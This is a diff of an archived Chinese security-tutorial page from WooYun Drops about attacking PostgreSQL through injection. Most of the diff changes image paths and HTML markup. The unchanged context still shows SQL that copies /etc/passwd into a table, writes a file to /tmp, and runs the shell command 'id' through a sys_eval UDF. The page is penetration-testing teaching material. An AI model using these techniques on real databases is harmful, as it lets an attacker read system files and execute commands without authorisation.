@@ -3,16 +3,16 @@
 			<head>
 			     <title>PostgreSQL的那点事儿 - 疯狗</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/218">http://drops.wooyun.org/tips/218</a></h1>
 				
       <p>
-        <p>今天无意发现了个PostgreSQL环境，线上学习了下，一般的数据注射（读写数据库）差异不大，不做讨论，个人比较关心PostgreSQL的文件读取和命令执行方面。</p>
+        </p><p>今天无意发现了个PostgreSQL环境，线上学习了下，一般的数据注射（读写数据库）差异不大，不做讨论，个人比较关心PostgreSQL的文件读取和命令执行方面。</p>
 
 <h3>0x00 文件读取/写入</h3>
 
-<hr />
+<hr>
 
 <p>PostgreSQL 8.1 以后提供了一组现成的文件操作函数</p>
 
@@ -26,19 +26,19 @@
 
 <h4>a）比如列目录</h4>
 
-<p><img src="http://static.wooyun.org/201307/2013070916495021606.png" alt="2013070916495021606.png" /></p>
+<p><img src="../images_result/images/2013070916495021606.png" alt="2013070916495021606.png"></p>
 
 <h4>b）读取权限允许的文件</h4>
 
-<p><img src="http://static.wooyun.org/201307/2013070916501626793.png" alt="2013070916501626793.png" /></p>
+<p><img src="../images_result/images/2013070916501626793.png" alt="2013070916501626793.png"></p>
 
 <p>还有个写文件函数测试并未成功，而且只能像data下写也是满足不了需求的。</p>
 
 <h4>c）比较可行的文件读取方案</h4>
 
-<p><img src="http://static.wooyun.org/201307/2013070916503429269.png" alt="2013070916503429269.png" /></p>
+<p><img src="../images_result/images/2013070916503429269.png" alt="2013070916503429269.png"></p>
 
-<p><img src="http://static.wooyun.org/201307/2013070916510067232.png" alt="2013070916510067232.png" /></p>
+<p><img src="../images_result/images/2013070916510067232.png" alt="2013070916510067232.png"></p>
 
 <pre><code>drop table wooyun;
 CREATE TABLE wooyun(t TEXT);
@@ -54,7 +54,7 @@ COPY wooyun(t) FROM '/etc/passwd';
 SELECT * FROM wooyun;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201307/2013070916512953973.png" alt="2013070916512953973.png" /></p>
+<p><img src="../images_result/images/2013070916512953973.png" alt="2013070916512953973.png"></p>
 
 <h4>d）写入文件</h4>
 
@@ -64,11 +64,11 @@ INSERT INTO wooyun(t) VALUES ('hello wooyun');
 COPY wooyun(t) TO '/tmp/wooyun';
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201307/2013070916514499642.png" alt="2013070916514499642.png" /></p>
+<p><img src="../images_result/images/2013070916514499642.png" alt="2013070916514499642.png"></p>
 
 <p>读一下看看是否存在</p>
 
-<p><img src="http://static.wooyun.org/201307/2013070916515914176.png" alt="2013070916515914176.png" /><br />
+<p><img src="../images_result/images/2013070916515914176.png" alt="2013070916515914176.png"><br>
 Bingo~</p>
 
 <h3>0x01 命令执行</h3>
@@ -180,27 +180,27 @@ lib_postgresqludf_sys.so
 <pre><code>select sys_eval('id'); 
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201307/2013070916522426778.jpg" alt="2013070916522426778.jpg" /></p>
+<p><img src="../images_result/images/2013070916522426778.jpg" alt="2013070916522426778.jpg"></p>
 
 <p>也许服务器没装PostgreSQL的Perl、Python支持，但是C库是通用的。</p>
 
-<p>参考：<br />
-<a href="http://static.wooyun.org/201307/2013070916495021606.png">1</a>PostgreSQL SQL Injection Cheat Sheet<br />
-http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet<br />
-<a href="http://static.wooyun.org/201307/2013070916501626793.png">2</a>OWASP Backend Security Project Testing PostgreSQL<br />
-https://www.owasp.org/index.php/OWASP&#95;Backend&#95;Security&#95;Project&#95;Testing_PostgreSQL<br />
-<a href="http://static.wooyun.org/201307/2013070916503429269.png">3</a>PostGreSQL注入学习(续篇)<br />
-http://www.hackol.com/news/201007270731289820885.shtml<br />
-<a href="http://static.wooyun.org/201307/2013070916510067232.png">4</a>PostgreSQL Adminpack<br />
-http://www.postgresql.org/docs/8.4/static/adminpack.html<br />
-<a href="http://static.wooyun.org/201307/2013070916512953973.png">5</a>PostgreSQL 外部动态连接库魔法块的使用<br />
-http://my.oschina.net/quanzl/blog/136907<br />
-<a href="http://static.wooyun.org/201307/2013070916514499642.png">6</a>Chapter 37. Procedural Languages<br />
-http://www.postgresql.org/docs/8.3/static/xplang.html<br />
-<a href="http://static.wooyun.org/201307/2013070916515914176.png">7</a>postgresql "初级"注入大法<br />
-http://zone.wooyun.org/content/1591<br />
-<a href="http://www.postgresql.org/docs/8.3/static/xplang.html">8</a>pg_largeobject<br />
-http://www.php100.com/manual/PostgreSQL8/catalog-pg-largeobject.html</p>      </p>
+<p>参考：<br>
+<a href="http://static.wooyun.org/201307/2013070916495021606.png">1</a>PostgreSQL SQL Injection Cheat Sheet<br>
+http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet<br>
+<a href="http://static.wooyun.org/201307/2013070916501626793.png">2</a>OWASP Backend Security Project Testing PostgreSQL<br>
+https://www.owasp.org/index.php/OWASP&#95;Backend&#95;Security&#95;Project&#95;Testing_PostgreSQL<br>
+<a href="http://static.wooyun.org/201307/2013070916503429269.png">3</a>PostGreSQL注入学习(续篇)<br>
+http://www.hackol.com/news/201007270731289820885.shtml<br>
+<a href="http://static.wooyun.org/201307/2013070916510067232.png">4</a>PostgreSQL Adminpack<br>
+http://www.postgresql.org/docs/8.4/static/adminpack.html<br>
+<a href="http://static.wooyun.org/201307/2013070916512953973.png">5</a>PostgreSQL 外部动态连接库魔法块的使用<br>
+http://my.oschina.net/quanzl/blog/136907<br>
+<a href="http://static.wooyun.org/201307/2013070916514499642.png">6</a>Chapter 37. Procedural Languages<br>
+http://www.postgresql.org/docs/8.3/static/xplang.html<br>
+<a href="http://static.wooyun.org/201307/2013070916515914176.png">7</a>postgresql "初级"注入大法<br>
+http://zone.wooyun.org/content/1591<br>
+<a href="http://www.postgresql.org/docs/8.3/static/xplang.html">8</a>pg_largeobject<br>
+http://www.php100.com/manual/PostgreSQL8/catalog-pg-largeobject.html</p>      <p></p>
     
 			</body>
 		</html>
